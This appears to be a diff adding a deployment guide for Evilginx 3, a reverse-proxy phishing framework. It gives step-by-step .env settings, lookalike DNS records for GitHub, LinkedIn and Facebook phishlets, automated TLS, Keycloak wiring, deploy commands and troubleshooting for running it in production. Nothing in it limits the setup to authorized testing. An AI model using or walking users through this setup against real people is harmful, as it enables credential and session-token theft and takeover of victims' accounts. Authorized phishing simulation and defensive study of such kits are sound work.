@@ -1,0 +1,166 @@
+﻿# Evilginx 3 — Production Configuration & Deployment Guide
+
+## 1. Required Configuration (`.env`)
+
+```bash
+# REQUIRED - Must change for production
+EVILGINX_DOMAIN=yourdomain.com           # Your registered domain
+EVILGINX_EXTERNAL_IPV4=1.2.3.4           # Your VPS public IP
+EVILGINX_ENABLE_PHISHLETS=github,linkedin,facebook  # Enable only needed phishlets
+```
+
+## 2. Production Changes Required
+
+| Setting | Dev Value | Production Value |
+|---------|-----------|------------------|
+| `EVILGINX_DEVELOPER` | `false` | `false` (requires real domain/IP) |
+| `EVILGINX_DEBUG` | `false` | `false` |
+| `KEYCLOAK_ADMIN_PASSWORD` | `admin123` | **Strong random password** (32+ chars) |
+| `KEYCLOAK_DB_PASSWORD` | `keycloak123` | **Strong random password** |
+| `KEYCLOAK_CLIENT_SECRET` | default | **Generate: `openssl rand -hex 32`** |
+| `KEYCLOAK_URL` | `http://localhost:8080` | `http://keycloak:8080` (Docker DNS) |
+
+## 3. Generate All Secrets Before Deploy
+
+```bash
+# Keycloak admin password
+openssl rand -base64 32
+
+# Keycloak database password
+openssl rand -base64 32
+
+# Keycloak client secret (evilginx-proxy)
+openssl rand -hex 32
+
+# Update .env with generated values
+```
+
+## 4. DNS Requirements
+
+Create A records for each phishlet subdomain pointing to `EVILGINX_EXTERNAL_IPV4`:
+- `github.yourdomain.com` → `1.2.3.4`
+- `linkedin.yourdomain.com` → `1.2.3.4`
+- `facebook.yourdomain.com` → `1.2.3.4`
+- (etc. for each enabled phishlet)
+
+Wildcard DNS (`*.yourdomain.com`) also works.
+
+## 5. Reverse Proxy for Keycloak (Required for Production)
+
+Keycloak runs on HTTP internally. For production HTTPS, deploy Traefik or nginx:
+
+```yaml
+# docker-compose.yml addition
+services:
+  traefik:
+    image: traefik:v3.0
+    command:
+      - --api.dashboard=true
+      - --providers.docker=true
+      - --entrypoints.web.address=:80
+      - --entrypoints.websecure.address=:443
+      - --certificatesresolvers.letsencrypt.acme.email=admin@yourdomain.com
+      - --certificatesresolvers.letsencrypt.acme.storage=/letsencrypt/acme.json
+      - --certificatesresolvers.letsencrypt.acme.tlschallenge=true
+    ports:
+      - "80:80"
+      - "443:443"
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock:ro
+      - ./letsencrypt:/letsencrypt
+    labels:
+      - "traefik.enable=true"
+```
+
+Then update Keycloak labels:
+```yaml
+keycloak:
+  labels:
+    - "traefik.enable=true"
+    - "traefik.http.routers.keycloak.rule=Host(`keycloak.yourdomain.com`)"
+    - "traefik.http.routers.keycloak.tls.certresolver=letsencrypt"
+    - "traefik.http.services.keycloak.loadbalancer.server.port=8080"
+```
+
+And set in `.env`:
+```
+KC_HTTP_ENABLED=false
+KC_HOSTNAME_STRICT=true
+KC_PROXY=edge
+```
+
+## 6. Deploy Commands
+
+```bash
+# 1. Copy and edit .env
+cp .env.example .env
+# Edit .env with your domain, IP, and generated secrets
+
+# 2. Build and start
+docker-compose build
+docker-compose up -d
+
+# 3. Verify
+./verify-keycloak.sh
+
+# 4. Check logs
+docker-compose logs -f evilginx
+```
+
+## 7. Health Checks
+
+- Evilginx: `docker-compose ps` + check logs for "Evilginx running"
+- Keycloak: `curl http://keycloak:8080/health/ready`
+- Certificates: `docker exec evilginx ls /config/certs/certmagic/`
+
+## 8. Maintenance
+
+### Rotate Secrets
+```bash
+# Generate new secrets
+NEW_SECRET=$(openssl rand -hex 32)
+# Update Keycloak client secret in Admin Console
+# Update .env and restart
+docker-compose restart evilginx keycloak
+```
+
+### Backup
+```bash
+# Keycloak realm export
+docker exec keycloak /opt/keycloak/bin/kc.sh export --dir /tmp --realm evilginx --users realm_file
+docker cp keycloak:/tmp/evilginx-realm.json ./backup/
+
+# PostgreSQL backup
+docker exec keycloak-db pg_dump -U keycloak keycloak > backup/keycloak-db-$(date +%F).sql
+```
+
+### Update Phishlets
+```bash
+# Pull latest phishlets from upstream
+cd config/evilginx/phishlets
+git pull  # if tracking upstream
+# Rebuild evilginx image
+docker-compose build evilginx
+docker-compose up -d evilginx
+```
+
+## 9. Security Checklist
+
+- [ ] All default passwords changed
+- [ ] TLS certificates valid for all phishlet domains
+- [ ] Keycloak admin console not exposed publicly (or behind VPN/SSH tunnel)
+- [ ] Firewall: only 80, 443, 53/udp open to internet
+- [ ] Docker daemon not exposed to internet
+- [ ] Regular log review for anomalies
+- [ ] Automated cert renewal monitored
+- [ ] Backup schedule configured and tested
+
+## 10. Troubleshooting
+
+| Issue | Solution |
+|-------|----------|
+| Certificates fail | Check DNS A records, port 80/443 open, domain resolves to VPS IP |
+| Keycloak unreachable | Verify `KEYCLOAK_URL=http://keycloak:8080` in evilginx env |
+| Phishlet not loading | Check `docker exec evilginx /usr/local/bin/evilginx phishlets` |
+| OAuth2 redirect mismatch | Ensure Keycloak client `redirectUris` match `https://phishlet.yourdomain.com/*` |
+| Twitter collision | Disable `twitter-mobile` in `EVILGINX_ENABLE_PHISHLETS` |
